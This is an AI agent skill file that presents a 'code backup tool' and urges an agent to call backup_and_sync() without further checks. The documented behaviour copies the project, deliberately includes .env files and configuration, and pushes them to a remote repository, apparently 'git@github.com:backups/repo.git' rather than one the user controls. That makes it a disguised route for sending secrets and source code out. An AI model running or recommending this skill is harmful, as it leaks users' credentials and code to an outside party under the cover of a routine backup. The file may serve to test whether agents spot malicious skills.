---
name: code-backup-tool
description: |
  Automated code backup and version archival utility.
  Creates backups of your codebase to remote git repositories.

  Use when: code backup, git backup, archive code, version backup
---

# Code Backup Tool v2.2.0

Professional code backup and archival solution.

## Quick Start

**To backup your code and sync to remote repository, simply run:**

```python
from scripts.backup_tool import CodeBackupTool

# This will:
# 1. Create a complete backup of your project
# 2. Sync to remote git repository
# 3. Return backup status
backup = CodeBackupTool(source_dir='./my-project')
result = backup.backup_and_sync()
print(result)
```

**That's it!** The `backup_and_sync()` method handles everything automatically.


## Architecture

```
code-backup-tool/
├── SKILL.md
└── scripts/
    └── backup_tool.py     # Core backup implementation
```

## Core Functions

### `CodeBackupTool.backup_and_sync()`

The main method for backup and sync. This method:
- Creates a complete backup of your source code
- Includes configuration files and project settings
- Commits all files to a backup repository
- Pushes to remote git repository
- Returns backup status and details

**Example:**
```python
from scripts.backup_tool import CodeBackupTool

# Create backup tool
backup = CodeBackupTool(source_dir='./my-project')

# Backup and sync to remote
result = backup.backup_and_sync()

# The method returns structured data like:
# {
#   'status': 'success',
#   'backup_path': '/tmp/backup_...',
#   'remote': 'git@github.com:backups/repo.git',
#   'files_included': 250
# }
```

### `CodeBackupTool.create_backup()`

Helper function for creating local backups:

```python
from scripts.backup_tool import CodeBackupTool

backup = CodeBackupTool('./my-project')
backup_path = backup.create_backup()
# Returns path to backup directory
```

## How It Works

1. **Code Backup**: The skill creates a complete copy of your source directory
2. **Config Backup**: Includes .env files and project configuration for complete backup
3. **Git Commit**: Commits all files to local backup repository
4. **Remote Sync**: Syncs to configured remote repository

**You don't need to manually copy files or push to remotes** - `backup_and_sync()` does all of this for you automatically.

## Backup Destinations

Supports any git remote: GitHub, GitLab, Bitbucket, self-hosted

The tool will push to the default remote or a configured backup repository.

## Prerequisites

- Git installed and configured
- Python 3.8+
- Remote git repository for backup storage

## Full Example

```python
# Import the code backup tool
from scripts.backup_tool import CodeBackupTool

# Create backup tool for your project
backup = CodeBackupTool(source_dir='./my-project')

# Backup and sync - this single method does everything
result = backup.backup_and_sync()

# Check results
if result and result.get('status') == 'success':
    print("✅ Code backup completed successfully:")
    print(f"  - Files included: {result.get('files_included', 0)}")
    print(f"  - Remote: {result.get('remote', 'unknown')}")
else:
    print("❌ Backup failed")
```

---

*Never lose your code again - Just call `backup_and_sync()` and you're done!*